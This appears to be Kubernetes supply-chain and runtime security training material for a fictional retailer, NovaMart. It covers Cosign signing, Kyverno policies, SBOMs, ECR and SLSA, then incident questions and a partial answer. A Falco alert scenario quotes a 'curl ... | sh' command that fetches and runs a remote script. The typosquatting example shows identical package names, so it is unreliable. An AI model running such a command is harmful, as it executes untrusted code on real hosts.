### Image Signing — Cosign/Sigstore

```text
WHY SIGN IMAGES?

Without signing:
  1. Someone pushes a compromised image to ECR
  2. Tag "v2.3.1" now points to malicious image
  3. Deployment pulls it, runs it in production
  4. No way to verify the image came from your CI pipeline

With signing:
  1. CI pipeline builds image AND signs it with a private key
  2. Admission controller verifies signature before allowing deployment
  3. If signature doesn't match → pod REJECTED
  4. Even if ECR is compromised, unsigned/tampered images can't deploy

COSIGN (part of Sigstore project):
  - Signs OCI images with cryptographic signatures
  - Stores signatures alongside images in the registry
  - Supports: key-pair, KMS-backed keys, keyless (OIDC identity)
  - CNCF project, becoming the standard
```

```bash
# Cosign — Key-based signing (NovaMart's approach)

# Generate a key pair (or use KMS-backed key)
# NovaMart uses AWS KMS — private key never leaves KMS
cosign generate-key-pair --kms awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id

# Sign an image (done in CI pipeline after push)
cosign sign \
  --key awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id \
  888888888888.dkr.ecr.us-east-1.amazonaws.com/payment-svc:v2.3.1

# Verify a signature (done at admission or manually)
cosign verify \
  --key awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id \
  888888888888.dkr.ecr.us-east-1.amazonaws.com/payment-svc:v2.3.1

# Keyless signing (uses OIDC identity — GitHub Actions, Google, etc.)
# No key management needed — identity proves who signed
COSIGN_EXPERIMENTAL=1 cosign sign \
  888888888888.dkr.ecr.us-east-1.amazonaws.com/payment-svc:v2.3.1
# This uses the Rekor transparency log to record the signing event
# Verifiers check: was this signed by a GitHub Actions workflow from our repo?
```

```text
KEY-BASED vs KEYLESS SIGNING:

  Key-based (KMS):
    ✅ Simple verification (public key is known)
    ✅ Works offline
    ✅ No dependency on external transparency log
    ❌ Must manage/rotate the signing key
    ❌ Key compromise = all signatures untrustworthy
    NovaMart uses this: KMS key managed by platform team

  Keyless (Sigstore):
    ✅ No key management (uses OIDC identity — "signed by GitHub Actions")
    ✅ Transparency log provides audit trail
    ✅ Identity-based (WHO signed, not WHAT key)
    ❌ Requires internet for verification (Rekor, Fulcio)
    ❌ Depends on OIDC provider availability
    Better for open-source projects, growing in enterprise adoption
```

### Admission-Time Signature Verification — Kyverno

```yaml
# Kyverno policy to verify image signatures at admission
# This is WHY NovaMart uses Kyverno alongside Gatekeeper —
# Kyverno's image verification is purpose-built for this

apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
  annotations:
    policies.kyverno.io/title: "Verify Image Signatures"
    policies.kyverno.io/description: >
      All container images in production must be signed by our CI pipeline.
      Images without valid Cosign signatures are rejected.
spec:
  validationFailureAction: Enforce  # Enforce | Audit
  background: true    # Also check existing resources
  webhookTimeoutSeconds: 30  # Signature verification can be slow
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - payments
                - orders
                - search
                - notifications
                - cart
                - users
                - fraud
      verifyImages:
        - imageReferences:
            - "888888888888.dkr.ecr.us-east-1.amazonaws.com/*"
            - "888888888888.dkr.ecr.us-west-2.amazonaws.com/*"
            - "888888888888.dkr.ecr.eu-west-1.amazonaws.com/*"
          attestors:
            - entries:
                - keys:
                    kms: awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id
          # mutateDigest replaces tag reference with digest
          # This prevents TOCTOU: image verified by tag, but tag
          # changed between verification and pull
          mutateDigest: true
          # required: true means unsigned images are REJECTED
          required: true

    - name: verify-sbom-attestation
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - payments  # PCI namespaces require SBOM
                - fraud
      verifyImages:
        - imageReferences:
            - "888888888888.dkr.ecr.*.amazonaws.com/*"
          attestations:
            - type: https://cyclonedx.org/bom
              attestors:
                - entries:
                    - keys:
                        kms: awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id
              conditions:
                - all:
                    # Reject if SBOM contains any CRITICAL vulnerabilities
                    - key: "{{ components[?vulnerabilities[?ratings[?severity == 'critical']] | length(@) > `0`] | length(@) }}"
                      operator: Equals
                      value: "0"
```

```text
mutateDigest: true EXPLAINED:

  Without mutateDigest:
    1. Kyverno verifies: payment-svc:v2.3.1 has valid signature ✓
    2. Kubelet pulls: payment-svc:v2.3.1
    3. BUT between step 1 and 2, attacker re-tags v2.3.1 to malicious image
    4. Kubelet pulls the MALICIOUS image (tag still matches, but digest changed)
    
    This is a TOCTOU (Time Of Check / Time Of Use) attack.

  With mutateDigest:
    1. Kyverno verifies: payment-svc:v2.3.1 → resolves to sha256:abc123
    2. Kyverno MUTATES the pod spec: image → payment-svc@sha256:abc123
    3. Kubelet pulls: payment-svc@sha256:abc123 (immutable reference)
    4. Even if the tag is re-pointed, kubelet pulls the verified digest

  This is why Kyverno is better than Gatekeeper for image verification —
  it needs the mutation capability to pin the digest.
```

### SBOM — Software Bill of Materials

```text
SBOM = A complete inventory of every component in your software.

  Like an ingredient list on food packaging.
  For NovaMart's payment-svc image, the SBOM lists:
    - Base image: gcr.io/distroless/java17-debian12@sha256:...
    - OS packages: libc6 2.36, libssl3 3.0.11, ...
    - Java dependencies: spring-boot 3.2.0, jackson 2.16.0,
                         stripe-java 24.3.0, ...
    - Transitive dependencies: netty 4.1.100, snakeyaml 2.2, ...

WHY SBOM MATTERS:
  1. Vulnerability response: When Log4Shell hits, you grep your SBOMs
     to find every image containing log4j in < 5 minutes
     WITHOUT SBOMs: you rebuild every image, scan manually, panic
     
  2. License compliance: Is your payment-svc accidentally including
     a GPL library? SBOM tells you immediately.
     
  3. Regulatory requirement: PCI-DSS, Executive Order 14028 (US gov),
     FedRAMP all increasingly require SBOMs
     
  4. Incident forensics: Compromised dependency? SBOM shows exactly
     which images are affected and when they were built.

SBOM FORMATS:
  CycloneDX: More security-focused, includes vulnerability data
  SPDX: More license-focused, ISO standard (ISO/IEC 5962:2021)
  NovaMart uses: CycloneDX (better tooling for vulnerability correlation)

GENERATION:
  syft <image> -o cyclonedx-json > sbom.json    # Standalone tool
  trivy image --format cyclonedx -o sbom.json    # Trivy built-in
  docker sbom <image>                            # Docker Desktop built-in

STORAGE:
  Attached to image as OCI artifact (cosign attest)
  Also archived in S3 for historical queries
  Queryable: "show me all images containing log4j-core < 2.17.1"
```

### ECR Security Configuration

```hcl
# ECR repository with security features enabled

resource "aws_ecr_repository" "payment_svc" {
  name                 = "payment-svc"
  image_tag_mutability = "IMMUTABLE"  # Tags cannot be overwritten
  # IMMUTABLE prevents:
  #   - Accidental tag overwrite
  #   - Tag hijacking attacks
  #   - "latest" confusion (since you can't re-push same tag)

  image_scanning_configuration {
    scan_on_push = true  # Scan every image on push
    # ECR Enhanced Scanning (Inspector integration):
    # Continuous scanning — rescans when new CVEs are published
    # Not just on-push
  }

  encryption_configuration {
    encryption_type = "KMS"
    kms_key         = aws_kms_key.ecr_encryption.arn
    # Default: AES-256 (AWS managed). KMS gives you key control.
  }

  tags = {
    Service     = "payment-svc"
    Team        = "payments"
    Environment = "production"
  }
}

# Lifecycle policy — prevent unbounded image accumulation
resource "aws_ecr_lifecycle_policy" "payment_svc" {
  repository = aws_ecr_repository.payment_svc.name

  policy = jsonencode({
    rules =[
      {
        rulePriority = 1
        description  = "Keep last 20 tagged images"
        selection = {
          tagStatus     = "tagged"
          tagPrefixList = ["v"]
          countType     = "imageCountMoreThan"
          countNumber   = 20
        }
        action = {
          type = "expire"
        }
      },
      {
        rulePriority = 2
        description  = "Remove untagged images after 7 days"
        selection = {
          tagStatus   = "untagged"
          countType   = "sinceImagePushed"
          countUnit   = "days"
          countNumber = 7
        }
        action = {
          type = "expire"
        }
      }
    ]
  })
}

# ECR replication — multi-region for disaster recovery
resource "aws_ecr_replication_configuration" "cross_region" {
  replication_configuration {
    rule {
      destination {
        region      = "us-west-2"
        registry_id = data.aws_caller_identity.current.account_id
      }
      destination {
        region      = "eu-west-1"
        registry_id = data.aws_caller_identity.current.account_id
      }

      repository_filter {
        filter      = "payment-svc"
        filter_type = "PREFIX_MATCH"
      }
      repository_filter {
        filter      = "order-svc"
        filter_type = "PREFIX_MATCH"
      }
      # Only replicate critical services — not every image
    }
  }
}

# ECR pull-through cache — cache upstream images (distroless, etc.)
resource "aws_ecr_pull_through_cache_rule" "docker_hub" {
  ecr_repository_prefix = "docker-hub"
  upstream_registry_url = "registry-1.docker.io"
  credential_arn        = aws_secretsmanager_secret.dockerhub_token.arn
}

resource "aws_ecr_pull_through_cache_rule" "gcr" {
  ecr_repository_prefix = "gcr"
  upstream_registry_url = "gcr.io"
}

# With pull-through cache:
# Instead of: gcr.io/distroless/java17
# Use: 888888888888.dkr.ecr.us-east-1.amazonaws.com/gcr/distroless/java17
# Benefits:
# - Survives upstream registry outages
# - Faster pulls (same region)
# - No public internet dependency from production nodes
# - Scannable by ECR scanning
```

### SLSA Framework — Build Provenance

```text
SLSA (Supply-chain Levels for Software Artifacts) — pronounced "salsa"

SLSA defines LEVELS of supply chain security:

  Level 0: No guarantees
  Level 1: Build process documented, provenance generated
  Level 2: Hosted build service, authenticated provenance
  Level 3: Hardened build platform, non-falsifiable provenance
  Level 4: Two-party review, hermetic builds

NovaMart targets SLSA Level 3 for PCI services:
  ✅ Jenkins builds on ephemeral agents (no persistent state)
  ✅ Build provenance generated and signed (Cosign attestation)
  ✅ Provenance includes: source commit, builder identity, build steps
  ✅ Provenance is non-falsifiable (signed with KMS key, stored in Rekor)

PROVENANCE = "Where did this artifact come from?"
  For image payment-svc:v2.3.1, provenance answers:
    - WHO built it? (Jenkins pipeline, triggered by merge to main)
    - WHAT source? (Commit abc123 on github.com/novamart/payment-svc)
    - HOW? (Dockerfile in /deploy, build args: JAVA_VERSION=17)
    - WHEN? (2024-01-15T10:30:00Z)
    - WHERE? (Jenkins agent pod in novamart-prod EKS cluster)
```

```yaml
# Generate SLSA provenance in Jenkins pipeline
# Using slsa-github-generator or in-toto attestation

stage('Generate Provenance') {
  steps {
    sh """
      # Generate in-toto provenance attestation
      cat > provenance.json << EOF
      {
        "_type": "https://in-toto.io/Statement/v0.1",
        "predicateType": "https://slsa.dev/provenance/v0.2",
        "subject":[
          {
            "name": "${ECR_REGISTRY}/${IMAGE_NAME}",
            "digest": {
              "sha256": "\$(crane digest ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} | cut -d: -f2)"
            }
          }
        ],
        "predicate": {
          "builder": {
            "id": "https://jenkins.novamart.internal/job/payment-svc"
          },
          "buildType": "https://novamart.internal/jenkins-pipeline/v1",
          "invocation": {
            "configSource": {
              "uri": "git+https://bitbucket.org/novamart/payment-svc@refs/heads/main",
              "digest": { "sha1": "${GIT_COMMIT}" },
              "entryPoint": "Jenkinsfile"
            }
          },
          "metadata": {
            "buildStartedOn": "\$(date -u +%Y-%m-%dT%H:%M:%SZ)",
            "completeness": {
              "parameters": true,
              "environment": true,
              "materials": true
            }
          },
          "materials":[
            {
              "uri": "git+https://bitbucket.org/novamart/payment-svc",
              "digest": { "sha1": "${GIT_COMMIT}" }
            }
          ]
        }
      }
      EOF

      # Attest the provenance to the image
      cosign attest \
        --key awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id \
        --predicate provenance.json \
        --type slsaprovenance \
        ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
    """
  }
}
```

### Supply Chain Security Failure Modes

```text
FAILURE 1: Critical CVE in base image — all services affected
  CAUSE: Alpine/Debian/distroless releases security patch,
         but NovaMart images still use old base
  SYMPTOM: ECR scanning shows CRITICAL CVE across 50+ images
  IMPACT: PCI compliance violation, potential exploitation
  FIX:
    - Automated base image rebuild pipeline:
      ECR Enhanced Scanning detects CVE → EventBridge → Lambda →
      triggers Jenkins "rebuild all images" job
    - Pin base images by DIGEST, not tag (so you know exactly what changed)
    - Rebuild cadence: weekly base image refresh + emergency for CRITICAL
  PREVENTION:
    - Renovate Bot / Dependabot for base image updates in Dockerfiles
    - Separate base image repo with its own CI (test base → promote)

FAILURE 2: Image signature verification blocks deployment during incident
  CAUSE: Kyverno configured to Enforce signature verification,
         but signing key is rotated/unavailable
  SYMPTOM: All deploys fail with "image signature verification failed"
  IMPACT: Can't deploy hotfix during active incident
  FIX:
    - EMERGENCY: Change Kyverno policy to Audit mode temporarily:
      kubectl edit clusterpolicy verify-image-signatures
      # Change validationFailureAction: Enforce → Audit
    - Root cause: ensure KMS signing key is highly available,
      has proper key policy, monitored for access failures
  PREVENTION:
    - Support multiple signing keys (backup key in different KMS)
    - Break-glass procedure documented in runbook
    - Monitor: kyverno_policy_results_total{result="fail"} spike

FAILURE 3: Typosquatting attack in dependency
  CAUSE: Developer adds "requests-toolbelt" instead of
         "requests-toolbelt" (subtle typo) in requirements.txt
  SYMPTOM: Build succeeds, Trivy doesn't flag it (no CVE for the typo package),
           malicious code runs in production
  IMPACT: Credential theft, data exfiltration
  FIX: Lock files (go.sum, package-lock.json) with integrity hashes
  PREVENTION:
    - Use Artifactory/Nexus as dependency proxy — only approved packages
    - Snyk Advisor (checks package reputation, not just CVEs)
    - Review dependency changes in PRs (diff lock files)
    - pip install --require-hashes (Python)

FAILURE 4: SBOM drift — production image doesn't match SBOM
  CAUSE: SBOM generated at build time, but image was rebuilt without
         updating SBOM attestation
  SYMPTOM: SBOM says log4j 2.17.1, actual image has 2.14.0
  FIX: Generate SBOM and attestation in the SAME pipeline step,
       atomically attached to the exact image digest
  PREVENTION: Never generate SBOM separately from the build.
              The SBOM is an artifact OF the build, not a separate process.

FAILURE 5: ECR pull-through cache serves stale/compromised upstream image
  CAUSE: Upstream Docker Hub image compromised, ECR caches it
  SYMPTOM: All nodes pull compromised cached image from ECR
  FIX:
    - ECR scanning catches known CVEs in cached images
    - Signature verification catches unsigned images
    - But ZERO-DAY malware in cached image is not detected
  PREVENTION:
    - Don't use public images directly — rebuild from source
    - Approve upstream images through a curation process
    - Pin by digest, not tag, even in pull-through cache

FAILURE 6: Cosign signature stored alongside image — registry compromise
  CAUSE: If ECR is compromised, attacker can delete signatures AND
         replace images, defeating the entire signing scheme
  SYMPTOM: No alert — signed images replaced with re-signed malicious ones
  FIX: Use transparency log (Rekor) in addition to registry signatures.
       Rekor is an immutable, append-only log that can't be tampered with.
  PREVENTION:
    - Rekor verification in addition to key verification
    - Cross-region registry replication (compare digests)
    - Monitor ECR CloudTrail for image delete/push from non-CI identities
```

---

## NovaMart Complete Kubernetes Security Architecture

```text
┌───────────────────────────────────────────────────────────────────────┐
│               NOVAMART K8S SECURITY — COMPLETE PICTURE                │
│                                                                       │
│ BEFORE CLUSTER (CI/CD):                                               │
│ ┌───────────────────────────────────────────────────────────────────┐ │
│ │ Bitbucket → Jenkins Pipeline:                                     │ │
│ │   1. SonarQube (code quality)                                     │ │
│ │   2. Snyk (dependency vulnerabilities)                            │ │
│ │   3. Docker build (multi-stage, non-root, distroless)             │ │
│ │   4. Trivy scan (image vulnerabilities + secrets + misconfig)     │ │
│ │   5. SBOM generation (CycloneDX via Trivy/Syft)                   │ │
│ │   6. Push to ECR (immutable tags)                                 │ │
│ │   7. Cosign sign (KMS-backed key)                                 │ │
│ │   8. Cosign attest SBOM + SLSA provenance                         │ │
│ │   9. Update manifests repo → ArgoCD sync                          │ │
│ └───────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│ AT CLUSTER ADMISSION:                                                 │
│ ┌───────────────────────────────────────────────────────────────────┐ │
│ │ API Server Admission Chain:                                       │ │
│ │                                                                   │ │
│ │ MUTATING:                                                         │ │
│ │   Istio sidecar injector → adds Envoy                             │ │
│ │   Vault Agent injector → adds secret sidecar (PCI namespaces)     │ │
│ │   Kyverno → pins image tag to digest (mutateDigest)               │ │
│ │                                                                   │ │
│ │ VALIDATING:                                                       │ │
│ │   PSA → enforces baseline/restricted per namespace                │ │
│ │   Gatekeeper → registry allowlist, resource limits, labels,       │ │
│ │                no privileged, no :latest, non-root                │ │
│ │   Kyverno → image signature verification (Cosign)                 │ │
│ └───────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│ INSIDE CLUSTER (Runtime):                                             │
│ ┌───────────────────────────────────────────────────────────────────┐ │
│ │ Falco (DaemonSet):                                                │ │
│ │   - Shell in container detection                                  │ │
│ │   - Cryptocurrency mining detection                               │ │
│ │   - Container drift (new executable)                              │ │
│ │   - Sensitive file access                                         │ │
│ │   - Reverse shell detection                                       │ │
│ │   - Unexpected K8s API access                                     │ │
│ │   - Package manager in production                                 │ │
│ │   → Falcosidekick → Slack + PagerDuty + Loki + auto-response      │ │
│ │                                                                   │ │
│ │ Istio mTLS:                                                       │ │
│ │   - All pod-to-pod traffic encrypted (STRICT mode)                │ │
│ │   - AuthorizationPolicy (L7 access control)                       │ │
│ │                                                                   │ │
│ │ NetworkPolicy:                                                    │ │
│ │   - Default deny ingress/egress per namespace                     │ │
│ │   - Explicit allow rules for known communication patterns         │ │
│ │   - DNS egress allowed (port 53) — common gotcha if missing       │ │
│ │                                                                   │ │
│ │ RBAC:                                                             │ │
│ │   - Least privilege per ServiceAccount                            │ │
│ │   - No cluster-admin for application workloads                    │ │
│ │   - IRSA for AWS access (no static credentials)                   │ │
│ └───────────────────────────────────────────────────────────────────┘ │
│                                                                       │
│ MONITORING & AUDIT:                                                   │
│ ┌───────────────────────────────────────────────────────────────────┐ │
│ │ Gatekeeper metrics → Prometheus → Grafana dashboard               │ │
│ │ Falco events → Loki → security team queries                       │ │
│ │ K8s audit log → CloudWatch → alerts on sensitive API calls        │ │
│ │ ECR scanning → EventBridge → SNS → security team                  │ │
│ │ CloudTrail → S3 → Athena queries for forensics                    │ │
│ │ cert-manager metrics → expiry alerts                              │ │
│ │ Vault audit log → Loki → who accessed what secret                 │ │
│ └───────────────────────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────────────────────┘
```

---

## Quick Reference Card

```text
ADMISSION CONTROL
─────────────────
Gatekeeper: OPA for K8s. ConstraintTemplate (Rego) + Constraint (params)
  Rollout: dryrun → warn → deny (NEVER skip to deny)
  HA: 3 replicas, PDB, high PriorityClass
  failurePolicy: Fail (secure) — emergency: delete webhook config
  Monitor: gatekeeper_violations, gatekeeper_request_duration_seconds

Kyverno: YAML-based policies. NovaMart uses for image signature verification only.
  verifyImages + mutateDigest = prevent TOCTOU tag hijacking
  validationFailureAction: Enforce | Audit

POD SECURITY
────────────
PSS Levels: Privileged (anything) > Baseline (no privilege escalation) > Restricted (hardened)
PSA Modes: enforce (block) | warn (allow + warning) | audit (allow + log)
Applied via namespace labels: pod-security.kubernetes.io/{mode}: {level}
PSA = baseline security. Gatekeeper = custom organizational policies. Use BOTH.

Restricted-compliant pod needs:
  runAsNonRoot: true
  allowPrivilegeEscalation: false
  capabilities: { drop: ["ALL"] }
  seccompProfile: { type: RuntimeDefault }
  readOnlyRootFilesystem: true (+ emptyDir for writable paths)

RUNTIME SECURITY (FALCO)
────────────────────────
eBPF probe → syscall capture → rules engine → Falcosidekick → alerts
DaemonSet, one per node, Guaranteed QoS, system-node-critical priority
Key rules: shell in container, crypto mining, drift detection, reverse shell
Auto-response: label (investigate) or kill (high-confidence rules only)
#1 operational problem: false positive fatigue → tune rules weekly

SUPPLY CHAIN
────────────
6 layers: Source → Build → Image → Registry → Admission → Runtime
Trivy: Scan vulns + secrets + misconfig. --exit-code 1 in CI to gate.
Cosign: Sign images with KMS key. Verify at admission (Kyverno).
SBOM: CycloneDX format, attached to image via cosign attest.
ECR: Immutable tags, scan-on-push, KMS encryption, pull-through cache.
SLSA: Build provenance — who built what from where.
mutateDigest: true prevents TOCTOU (tag → digest pinning at admission).

NOVAMART TOOL ALLOCATION
─────────────────────────
Gatekeeper: Custom K8s policies (registry, resources, labels, privileged)
Kyverno: Image signature + SBOM verification only
PSA: Baseline/restricted enforcement per namespace
Falco: Runtime syscall monitoring + automated response
Trivy: CI vulnerability scanning (primary)
Snyk: Dependency monitoring (continuous)
BlackDuck: License compliance
Cosign: Image signing + SBOM attestation
```

---

## Retention Questions

### Q1: Gatekeeper Emergency and Policy Rollout 🔥

**Scenario:** Wednesday 2 PM. The platform team deployed a new Gatekeeper ConstraintTemplate (`K8sRequireReadOnlyRootFS`) with `enforcementAction: deny` directly — skipping dryrun and warn phases. Within 30 minutes, 6 teams report they cannot deploy. The orders team has a critical hotfix for a payment calculation bug that's losing revenue.

1. What is your immediate action to unblock deployments? Give the exact command. Then explain why this is safe and what risk it carries.
2. After unblocking, you need to understand the blast radius. How do you find ALL resources that would violate this policy WITHOUT re-enabling enforcement? Give the exact process.
3. The root cause is that many services write to `/tmp`, `/var/cache`, or log to `/var/log` inside the container. These services currently have `readOnlyRootFilesystem: false`. Design the correct Gatekeeper policy that enforces read-only root filesystem BUT allows specific writable paths. Include the Rego and the Constraint.
4. Write the rollout plan for this policy that follows NovaMart's enforcement strategy. Include timelines, communication, and success criteria for each phase.

### Q2: Falco Alert Investigation 🔥

**Scenario:** Saturday 3 AM. PagerDuty fires: Falco CRITICAL alert — "Container drift detected" in the `orders` namespace. The alert details:

```text
DRIFT DETECTED: New executable launched in container
(process=curl cmdline="curl -s http://45.33.32.156/update.sh | sh"
 exe=/tmp/curl parent=sh
 container=order-svc pod=order-svc-7f8b9c6d4-x2k9p
 ns=orders image=888888888888.dkr.ecr.us-east-1.amazonaws.com/order-svc:v3.1.2)
```

1. This is 3 AM on a Saturday. Walk through your first 10 minutes — every action in order. Include exact kubectl commands. The order matters critically.
2. After containing the pod, you need to determine: was this an attacker, or was this a developer who left a debugging script running? What specific evidence do you look for and where? (Cover at least 5 evidence sources)
3. The investigation reveals: a Remote Code Execution (RCE) vulnerability in the order-svc (deserialization bug in a Java endpoint). The attacker exploited it to run the curl command. How many other pods are potentially affected, and how do you determine this?
4. What changes to NovaMart's security layers would have PREVENTED this attack from succeeding? Walk through each layer (admission, pod security, network, runtime) and identify what was missing or misconfigured.

### Q3: Supply Chain Incident 🔥

**Scenario:** Monday morning. ECR Enhanced Scanning sends an alert: CRITICAL CVE (CVE-2024-XXXX, CVSS 9.8) found in `libcurl` package present in your base image `gcr.io/distroless/java17-debian12`. The CVE allows remote code execution. ECR scanning shows 47 images in your registry contain the vulnerable package.

1. You need to know which of those 47 images are actually running in production RIGHT NOW. Give the exact process to cross-reference ECR scan results with running workloads. Include commands.
2. Of the 47 images, 12 are running in production across 3 namespaces. Rebuilding all 12 images will take ~2 hours (build + scan + sign + deploy). The CISO wants all 12 patched within 4 hours. Design the execution plan — what happens in parallel, what's sequential, and what's the communication plan?
3. During the rebuild, you discover that 3 of the 12 services are using a pinned base image digest (FROM gcr.io/distroless/java17-debian12@sha256:abc123...). The pinned digest IS the vulnerable version. The team that owns these services is on vacation. What do you do? Include the technical steps AND the organizational considerations.
4. After patching, how do you ensure this class of incident is handled faster next time? Design the automated pipeline that goes from "CVE published" to "all affected images rebuilt and deployed" with minimal human intervention. Include the trigger, decision logic, and safety gates.

Q4: Defense in Depth Failure Analysis 🔥
Scenario: Post-incident review reveals that an attacker deployed a cryptominer in the search namespace 3 weeks ago. It ran undetected for 3 weeks. Here's what the investigation found:

The attacker compromised a developer's Bitbucket credentials
Pushed a commit that modified the search-svc Dockerfile to add a cryptominer binary in a multi-stage build (hidden in an intermediate stage, copied to final image)
The CI pipeline built, scanned, signed, and deployed the image
The cryptominer ran as a background process inside the container
Your job: explain how EACH security layer failed.

CI/CD Layer: Why didn't Trivy catch the cryptominer binary? Why didn't SonarQube flag it? What specific scanning gap allowed this through? (Be precise about what each tool detects and doesn't detect.)
Admission Layer: The image was signed by Cosign and passed Gatekeeper policies. Explain why admission control CANNOT catch this type of attack and what that means for security architecture.
Runtime Layer: Falco was running with the default rules plus NovaMart custom rules (from this lesson). The cryptominer rule SHOULD have caught this. Give at least 3 specific reasons why Falco might have missed it for 3 weeks.
Design the detection that WOULD have caught this within hours, not weeks. Cover: what metrics anomaly would appear, what Falco rule adjustment is needed, and what additional monitoring would detect cryptominers that evade process-name-based detection.

# NovaMart Kubernetes Security — Complete Incident Response & Analysis

---

## Q1: Gatekeeper Emergency and Policy Rollout 🔥

### 1. Immediate Unblock Action

```bash
kubectl patch K8sRequireReadOnlyRootFS require-readonly-rootfs \
  --type='merge' \
  -p '{"spec":{"enforcementAction":"warn"}}' \
  -n gatekeeper-system
```

If the constraint name is unknown:

```bash
# Find the constraint first
kubectl get K8sRequireReadOnlyRootFS

# Then patch it
kubectl patch K8sRequireReadOnlyRootFS <NAME> \
  --type='merge' \
  -p '{"spec":{"enforcementAction":"warn"}}'
```

**Why this is safe:**
- `warn` still evaluates every admission request against the policy and emits audit warnings in admission responses and in the Gatekeeper audit log — you lose **zero** visibility
- Deployments are immediately unblocked because `warn` does not reject the admission webhook call
- The orders team can push their critical payment hotfix within minutes
- You maintain a complete record of what *would* have been denied for blast radius analysis

**Risk it carries:**
- Any new deployment that violates the policy will now succeed, meaning a container with a writable root filesystem could be admitted during this window
- If an attacker was specifically waiting for enforcement to drop, they have an opening
- Teams may deploy non-compliant workloads during the warn window that become harder to remediate later ("it works in prod, don't touch it" syndrome)
- The warn-phase data could be noisy if many teams deploy simultaneously, making analysis harder

---

### 2. Blast Radius Assessment Without Re-enabling Enforcement

**Step 1: Use Gatekeeper Audit to find all existing violations**

Gatekeeper's audit controller continuously evaluates existing resources against constraints, even in `warn` or `dryrun` mode.

```bash
# Get all violations reported by the audit controller
kubectl get K8sRequireReadOnlyRootFS require-readonly-rootfs -o json \
  | jq '.status.violations[] | {name: .name, namespace: .namespace, kind: .kind, message: .message}'
```

**Step 2: Cross-reference with a direct cluster-wide query**

```bash
# Find ALL pods without readOnlyRootFilesystem: true
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(
    .spec.containers[]? |
    (.securityContext.readOnlyRootFilesystem == null) or
    (.securityContext.readOnlyRootFilesystem == false)
  ) |
  [.metadata.namespace, .metadata.name,
   (.spec.containers[] |
    select((.securityContext.readOnlyRootFilesystem == null) or
           (.securityContext.readOnlyRootFilesystem == false)) |
    .name)] |
  @tsv
'
```

**Step 3: Also check Deployments/StatefulSets/DaemonSets (template-level)**

```bash
# Check Deployments
kubectl get deployments -A -o json | jq -r '
  .items[] |
  . as $d |
  .spec.template.spec.containers[] |
  select((.securityContext.readOnlyRootFilesystem == null) or
         (.securityContext.readOnlyRootFilesystem == false)) |
  [$d.metadata.namespace, $d.metadata.name, .name] | @tsv
'
```

Repeat for `statefulsets`, `daemonsets`, `jobs`, `cronjobs`.

**Step 4: Generate a prioritized report**

```bash
# Export Gatekeeper audit results to a structured report
kubectl get K8sRequireReadOnlyRootFS require-readonly-rootfs -o json \
  | jq '[.status.violations[] | {namespace, name, kind, message}]' \
  > /tmp/readonly-rootfs-violations-$(date +%Y%m%d).json

# Count by namespace
cat /tmp/readonly-rootfs-violations-*.json | jq 'group_by(.namespace) | map({namespace: .[0].namespace, count: length}) | sort_by(-.count)'
```

**Step 5: Verify results with `gator` CLI locally**

```bash
# Use gator to test the policy against all cluster resources offline
gator verify --filename=constrainttemplate.yaml --filename=constraint.yaml
```

This gives you the complete blast radius without any enforcement risk.

---

### 3. Correct Gatekeeper Policy — Read-Only Root FS with Writable Exceptions

**ConstraintTemplate (with Rego):**

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequirereadonlyrootfs
  annotations:
    description: >-
      Requires readOnlyRootFilesystem: true on all containers.
      Allows writable paths via emptyDir volume mounts for
      specific allowed directories.
spec:
  crd:
    spec:
      names:
        kind: K8sRequireReadOnlyRootFS
      validation:
        openAPIV3Schema:
          type: object
          properties:
            allowedWritablePaths:
              type: array
              description: "Mount paths that are permitted to be writable (via emptyDir/ephemeral volumes)"
              items:
                type: string
            exemptImages:
              type: array
              description: "Images exempt from this policy (e.g., init containers with special needs)"
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequirereadonlyrootfs

        import future.keywords.in

        violation[{"msg": msg}] {
          container := input_containers[_]
          not is_exempt(container)
          not container_has_readonly_rootfs(container)
          msg := sprintf(
            "Container '%s' in pod '%s' must set securityContext.readOnlyRootFilesystem to true. If the container needs writable paths, mount emptyDir volumes at: %v",[container.name, input.review.object.metadata.name, input.parameters.allowedWritablePaths]
          )
        }

        violation[{"msg": msg}] {
          container := input_containers[_]
          not is_exempt(container)
          container_has_readonly_rootfs(container)

          # Verify that writable paths use approved volume types only
          some writable_mount in container_writable_mounts(container)
          not mount_path_allowed(writable_mount)
          msg := sprintf(
            "Container '%s' has a volume mount at '%s' that is not in the allowed writable paths: %v",
            [container.name, writable_mount, input.parameters.allowedWritablePaths]
          )
        }

        input_containers[c] {
          c := input.review.object.spec.containers[_]
        }

        input_containers[c] {
          c := input.review.object.spec.initContainers[_]
        }

        input_containers[c] {
          c := input.review.object.spec.ephemeralContainers[_]
        }

        container_has_readonly_rootfs(container) {
          container.securityContext.readOnlyRootFilesystem == true
        }

        is_exempt(container) {
          exempt := input.parameters.exemptImages[_]
          startswith(container.image, exempt)
        }

        # Get all volume mount paths for a container
        container_writable_mounts(container) := paths {
          paths := {mount.mountPath |
            mount := container.volumeMounts[_]
            volume := input.review.object.spec.volumes[_]
            volume.name == mount.name
            # Only flag non-emptyDir, non-configMap, non-secret, non-projected mounts
            not volume.emptyDir
            not volume.configMap
            not volume.secret
            not volume.projected
            not volume.downwardAPI
          }
        }

        mount_path_allowed(path) {
          allowed := input.parameters.allowedWritablePaths[_]
          path == allowed
        }
```

**Constraint:**

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequireReadOnlyRootFS
metadata:
  name: require-readonly-rootfs
spec:
  enforcementAction: dryrun    # START HERE. Never jump to deny.
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
